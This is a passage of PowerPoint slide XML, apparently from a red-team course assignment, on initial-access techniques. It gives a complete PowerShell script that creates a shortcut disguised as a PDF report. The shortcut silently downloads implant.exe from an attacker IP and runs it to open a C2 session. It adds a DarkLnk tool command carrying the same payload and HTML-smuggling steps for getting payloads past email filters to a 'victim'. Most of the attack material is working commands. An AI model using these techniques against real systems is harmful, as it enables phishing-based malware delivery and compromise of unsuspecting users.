              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Run this on your Windows VM (where you want to create the LNK file).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Replace 192.168.1.100 with your Kali IP and adjust the payload URL if needed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>powershell</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t># 1. Create the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>WScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> Shell object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>WshShell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> = New-Object -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>ComObject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>WScript.Shell</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t># 2. Define where to save the LNK file (Desktop, disguised as a PDF)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>shortcutPath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> = "$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>env:USERPROFILE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>\Desktop\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Quarterly_Report.pdf.lnk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t># 3. Create the shortcut</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>$shortcut = $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>WshShell.CreateShortcut</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>($</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>shortcutPath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t># 4. Set target to PowerShell (legitimate binary)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>shortcut.TargetPath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2624568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Autofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t># 5. Set arguments: hidden, download and execute implant</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>shortcut.Arguments</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> = "-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>WindowStyle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> Hidden -Command ""(New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>DownloadFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>('http://192.168.1.100/implant.exe', '%TEMP%\implant.exe'); Start-Process '%TEMP%\implant.exe'"""</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t># 6. (Optional) Use a legitimate icon – PDF icon from imageres.dll, index 65</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>shortcut.IconLocation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> = "C:\Windows\System32\imageres.dll, 65“</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t># 7. Save the LNK file</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>shortcut.Save</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Write-Host "[+] Malicious LNK created at: $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>shortcutPath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>“</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Completed </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> command</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>What this does:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>The file looks like a PDF (name ends with .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>pdf.lnk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> + PDF icon).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>When double‑clicked, it runs PowerShell hidden (-WindowStyle Hidden).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>PowerShell downloads implant.exe from your Kali server to %TEMP% and runs it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Your C2 listener gets a session.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41394638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Autofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Method 2 – Using DarkLnk Tool (Automated, More Disguise)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>DarkLnk is a third‑party tool that simplifies LNK creation and offers additional evasion like spoofing file extensions and changing the "Run as administrator" flag.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Installation (on Kali or Windows):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>git</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> clone https://github.com/wariv/DarkLnk</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>cd DarkLnk</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>pip install -r requirements.txt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Usage (on Windows with Python):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>python darklnk.py --output "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Invoice.pdf.lnk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>" --icon "C:\Windows\System32\imageres.dll,65" --target "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" --arguments "-WindowStyle Hidden -Command (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>DownloadFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>('http://192.168.1.100/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>implant.exe','%TEMP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>%\implant.exe'); Start-Process '%TEMP%\implant.exe'"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Testing Your LNK File</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Host implant.exe on Kali:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> python3 -m </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>http.server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> 80</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26691016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 y="0"/>
            <a:ext cx="12390120" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Transfer the LNK file to a test Windows VM.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Double‑click the LNK. You should see:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>No PowerShell window appears.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>On Kali, a GET /implant.exe request appears in the HTTP logs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Your C2 listener receives a session.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Check icon and disguise: On the Windows desktop, the file appears with a PDF icon and the name </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Quarterly_Report.pdf.lnk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>. By default, Windows hides the .lnk extension, so the user only sees Quarterly_Report.pdf – a very effective disguise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20281776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8A146D-247D-BDD1-3863-142E49A55F16}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="11353800" cy="6176963"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="77500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Part 3. HTML Smuggling Create an HTML file that "assembles" a malicious payload on the user's browser to bypass email gateway filters. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Core Concept: Embed a malicious payload (e.g., .exe or .ps1) inside an HTML file using JavaScript. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>The payload is typically Base64-encoded or obfuscated within the HTML. When the victim opens </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>the file in a browser, the JavaScript decodes and creates the payload in memory, then prompts a </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>download. Because the file never appears as a suspicious attachment, it can bypass email and web </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>filters.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Step 1: Generate / Obtain Your Implant</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>You already have implant.exe from your C2 framework (Sliver, Havoc, or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40015484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Autofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="45000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Step 2: Encode It to Base64 (no wrapping)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="45000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Link to code  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://github.com/umarniazafrid/Week-10-Task-2-Part-2-Method-2/tree/main</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Step 3: Host the HTML File</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Place invoice.html in your web server directory and start the server:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> python3 -m </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>http.server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> 80</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Now the file is available at http://&lt;YOUR_KALI_IP&gt;/invoice.html.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Step 4: Deliver to Victim</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Send the link (http://&lt;YOUR_KALI_IP&gt;/invoice.html) via email or chat.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Or attach the invoice.html file directly (many email gateways will allow .html attachments).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="45000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Step 5: Victim Interaction &amp; Result</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Victim clicks the link (or opens the attachment) → browser loads the HTML.</a:t>
            </a:r>
          </a:p>
          <a:p>
